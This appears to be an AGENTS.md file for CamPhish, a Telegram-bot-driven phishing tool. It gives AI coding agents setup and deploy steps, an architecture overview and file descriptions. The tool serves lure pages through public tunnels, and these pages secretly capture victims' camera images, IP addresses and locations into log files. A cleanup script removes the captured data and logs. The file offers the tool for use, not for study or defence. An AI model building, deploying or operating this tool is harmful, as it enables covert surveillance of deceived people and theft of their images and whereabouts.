# CamPhish - AGENTS.md

## Quick Start
```bash
pip install python-telegram-bot
export TELEGRAM_BOT_TOKEN="your_token"
python bot.py
```

## Architecture
**Single Python file** (`bot.py`) orchestrates the tool. It calls `camphish.sh` (bash) via subprocess with piped stdin inputs and parses stdout for tunnel links.

## Flow
1. `python bot.py` starts Telegram bot
2. User selects tunnel (Ngrok/CloudFlare) → template → inputs
3. Bot writes inputs to stdin, calls `bash camphish.sh`
4. Bot parses output for tunnel link, sends to user
5. Target opens link → camera/location captured

## Key Files
| File | Purpose |
|------|---------|
| `bot.py` | **Single entry point** - Telegram bot + CamPhish orchestration |
| `camphish.sh` | Core CamPhish engine (PHP server, tunnel download/start) |
| `template.php` | Entry point for target: camera + location permissions |
| `ip.php`, `location.php`, `post.php` | Data capture handlers |
| `festivalwishes.html`, `LiveYTTV.html`, `OnlineMeeting.html` | Engagement templates |
| `cleanup.sh` | Remove logs, captured data |

## Commands
- `python bot.py` - Start bot (requires `TELEGRAM_BOT_TOKEN` env var)
- `bash cleanup.sh` - Manual cleanup

## Dependencies
- Python 3.8+ (runtime)
- `python-telegram-bot` (>=20.0)
- PHP 7.0+ (for web server)
- wget, unzip, curl (for tunnel binary downloads)

## Output Files
- `cam<timestamp>.png` - Camera captures
- `ip.txt` - Victim IP log
- `location_<timestamp>.txt` - Location records
- `saved_locations/` - Preserved location data

## Gotchas
- **Ngrok authtoken**: Must be configured before first use (`ngrok authtoken YOUR_TOKEN`)
- **Tunnel failures**: Check internet, authtoken validity, no duplicate processes
- **Kill stale processes**: `pkill -f ngrok; pkill -f cloudflared; pkill -f php`
- **Location permission**: If denied, tool still redirects (no blocking)

## Deploy (pella.app)
```bash
# 1. Install PHP
sudo apt install php wget unzip curl

# 2. Install Python dep
pip install python-telegram-bot

# 3. Set token and run
export TELEGRAM_BOT_TOKEN="your_token"
python bot.py
```
